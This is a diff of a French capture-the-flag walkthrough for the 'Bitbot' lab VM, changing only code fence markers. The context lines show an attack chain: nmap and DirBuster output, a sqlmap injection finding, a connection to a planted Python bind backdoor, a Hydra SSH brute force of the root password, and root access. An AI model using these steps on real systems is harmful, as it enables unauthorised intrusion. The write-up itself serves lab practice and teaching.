@@ -21,7 +21,7 @@ Oublie que t'as aucune chance, vas-y fonce
 
 Le scan des ports révèlent différents services dont du RPC qui ne nous sera d'aucune utilité :  
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-03 21:35 CEST
 Nmap scan report for 192.168.1.29
 Host is up (0.00022s latency).
@@ -68,7 +68,7 @@ J'ai aussi utilisé le module de *Metasploit* destiné à énumérer les éventu
 
 Avec *DirBuster* (un équivalent en Java de dirb) j'ai eu des résultats plus intéressants puisqu'il m'a trouvé les scripts suivants :  
 
-```plain
+```
 /stats.php
 /submit.php
 /header.php
@@ -113,7 +113,7 @@ Planté de baton
 
 Dans sa prose verbeuse sqlmap nous informe de la trouvaille suivante :  
 
-```plain
+```
 sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
 ---
 Place: GET
@@ -236,7 +236,7 @@ Le bot étant écrit en Python il est probable qu'il n'accepte d'exécuter que d
 
 J'ai trouvé [sur pastebin une backdoor Python très basique](http://pastebin.com/nTzn08TL) qui bind() un port mais fera notre affaire :)  
 
-```plain
+```
 $ ncat 192.168.1.29 31337 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.29:31337.
@@ -270,7 +270,7 @@ On ajoutera un fichier *authorized\_keys* à l'utilisateur *Botter* pour obtenir
 
 Dans les processus on retrouve le ssh, un *Exim* (101 = utilisateur spécifique exim) et le bot Python :  
 
-```plain
+```
 root      2661  0.0  0.2   6464  1084 ?        Ss   00:16   0:00 /usr/sbin/sshd
 101       3060  0.0  0.1   7400   908 ?        Ss   00:16   0:00 /usr/sbin/exim4 -bd -q30m
 root      3101  0.0  0.2   3488  1440 ?        S    00:16   0:00 sudo -u botter python /var/www/bot/bot.py
@@ -278,7 +278,7 @@ root      3101  0.0  0.2   3488  1440 ?        S    00:16   0:00 sudo -u botter 
 
 Dans */home/botter* se trouve un fichier *gen.sh* dont voici le contenu :  
 
-```plain
+```
 $ cat gen.sh
 ifconfig eth0 | grep inet | grep -v inet6 | awk '{print $2substr(rand(),0,5);}' | awk '{print $0"\n"$0}' | passwd
 ```
@@ -295,7 +295,7 @@ Le kernel est un 3.2.0-4-686-pae donc on va fouiller côté mot de passe plutôt
 
 Si je lance les commandes du script (sauf le passwd final) j'obtiens ceci :  
 
-```plain
+```
 addr:192.168.1.290.19
 addr:192.168.1.290.19
 ```
@@ -334,7 +334,7 @@ fd.close()
 
 On teste ça avec la dernière version de *THC-Hydra* :  
 
-```plain
+```
 $ ./hydra -f -l root -P ../dict.txt -e nsr ssh://192.168.1.29
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -350,7 +350,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2014-06-09 11:17:58
 
 Et on applique :  
 
-```plain
+```
 botter@Bitbot:~$ su -
 Password: 
 root@Bitbot:~# id
